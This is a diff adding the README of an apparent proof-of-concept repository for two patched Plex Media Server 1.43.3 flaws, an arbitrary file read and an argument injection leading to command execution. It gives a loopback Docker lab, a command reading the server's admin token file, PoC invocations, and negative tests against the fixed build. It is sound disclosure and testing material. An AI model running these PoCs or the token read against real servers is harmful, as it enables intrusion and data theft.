@@ -1,0 +1,129 @@
+# Plex Media Server 1.43.3 Vulnerability PoCs
+
+This repository contains reproducible proof-of-concept code for two security
+issues fixed between Plex Media Server `1.43.3.10861-07dfddaeb` and
+`1.43.3.10896-cb3ebc72d`.
+
+The PoCs are organized by vulnerability and use only Python's standard library.
+Each directory contains a technical writeup, affected/fixed version evidence,
+command-line usage, and expected results.
+
+## Included findings
+
+| Directory | Impact | Primary CWE | Authentication | Fixed version |
+|---|---|---:|---|---|
+| [`profile-extra-rce`](profile-extra-rce/) | Delayed command execution as the Plex service account | CWE-88 | Confirmed with a local-administrator token | `1.43.3.10896-cb3ebc72d` |
+| [`metadata-file-read`](metadata-file-read/) | Read arbitrary files accessible to the Plex service account | CWE-36 | Confirmed with a local-administrator token | `1.43.3.10896-cb3ebc72d` |
+
+No finding first observed in `1.43.3.10896` and fixed only in the later
+`1.43.4.10903` beta is included here.
+
+## Version differences
+
+| Build | Profile `VideoEncodeFlags` | Metadata `file://` reference |
+|---|---|---|
+| `1.43.3.10861-07dfddaeb` | Accepted and forwarded to the transcoder | Returned files outside the item's bundle |
+| `1.43.3.10896-cb3ebc72d` | Rejected for client profile augmentation | Rejected unsupported or escaping references |
+| `1.43.4.10903-e5521bd8c` | Rejected | Rejected |
+
+Relevant strings added to the fixed PMS binary include:
+
+```text
+ClientProfileExtra: ignoring transcode target setting %s, which may not be set from a profile augmentation
+[Library] Rejecting metadata file request for unsupported media reference: %s
+[Library] Rejecting metadata file request that escapes the bundle directory: %s
+[Library] Ignoring media reference that escapes its bundle directory: %s
+```
+
+Equivalent patch strings were confirmed in the official Linux, macOS, and
+Windows packages. Dynamic PoC testing was performed on Linux x86-64 Docker
+images. See [TESTING.md](TESTING.md) for the test record.
+
+## Lab setup
+
+Use a disposable server containing no sensitive data. The following example
+publishes Plex only on the local loopback interface:
+
+```bash
+mkdir -p "$PWD/artifacts/plex-config" "$PWD/artifacts/media"
+ffmpeg -y -f lavfi -i testsrc=size=640x360:rate=24 \
+  -f lavfi -i sine=frequency=1000 -t 5 \
+  -c:v libx264 -pix_fmt yuv420p -c:a aac \
+  "$PWD/artifacts/media/test.mp4"
+docker run -d --name plex-10861 \
+  -p 127.0.0.1:32400:32400 \
+  -v "$PWD/artifacts/plex-config:/config" \
+  -v "$PWD/artifacts/media:/data" \
+  plexinc/pms-docker@sha256:dd9bcf6494a1f7e817710e75d2ff66beb68485b5ea1b63c7c712adc25983b9bb
+```
+
+Create a movie library for `/data` through the Plex web interface and note the
+test video's numeric rating key. On an unclaimed local test server, the
+generated local-administrator token can be obtained with:
+
+```bash
+docker exec plex-10861 sh -c \
+  'cat "/config/Library/Application Support/Plex Media Server/.LocalAdminToken"'
+```
+
+Run the file-read PoC:
+
+```bash
+python3 metadata-file-read/poc.py \
+  --url http://127.0.0.1:32400 \
+  --rating-key 1 \
+  --token TOKEN \
+  --file /etc/hostname
+```
+
+Run the complete profile-to-command-execution chain and have the PoC restart
+the disposable container to trigger Plex Script Host:
+
+```bash
+python3 profile-extra-rce/poc.py \
+  --url http://127.0.0.1:32400 \
+  --rating-key 1 \
+  --token TOKEN \
+  --command 'touch /config/PROFILE_RCE_MARKER' \
+  --container plex-10861 \
+  --verify-path /config/PROFILE_RCE_MARKER
+```
+
+For negative testing, create a second lab with a fresh configuration directory
+and the fixed amd64 image:
+
+```bash
+mkdir -p "$PWD/artifacts/fixed-config" "$PWD/artifacts/fixed-media"
+cp "$PWD/artifacts/media/test.mp4" "$PWD/artifacts/fixed-media/test.mp4"
+docker run -d --name plex-10896 \
+  -p 127.0.0.1:32401:32400 \
+  -v "$PWD/artifacts/fixed-config:/config" \
+  -v "$PWD/artifacts/fixed-media:/data" \
+  plexinc/pms-docker@sha256:c708587e4874617961a1bc24db9cffa2413653ff422f1b05dfec013339e6824d
+```
+
+Add the test video as a new library, obtain that server's token and rating key,
+and run both PoCs against `http://127.0.0.1:32401`. The file-read request must
+not return the selected server-side file. The RCE PoC must fail to find its
+per-run `.pth` payload.
+
+Stop and remove the lab containers when testing is complete:
+
+```bash
+docker stop plex-10861 plex-10896
+docker rm plex-10861 plex-10896
+```
+
+## Safety and scope
+
+These PoCs perform real server-side file access and command execution. Run them
+only against systems you own or are explicitly authorized to test. The Docker
+instructions bind PMS to `127.0.0.1` and are intended for an isolated lab.
+
+The token scope was tested with local-administrator tokens. Managed and shared
+user tokens were not tested, and no claim is made about those token classes.
+
+## References
+
+- [Plex security update announcement](https://forums.plex.tv/t/important-security-update-for-plex-media-server-v1-43-2-and-earlier/942319)
+- [Plex Media Server downloads](https://www.plex.tv/media-server-downloads/)
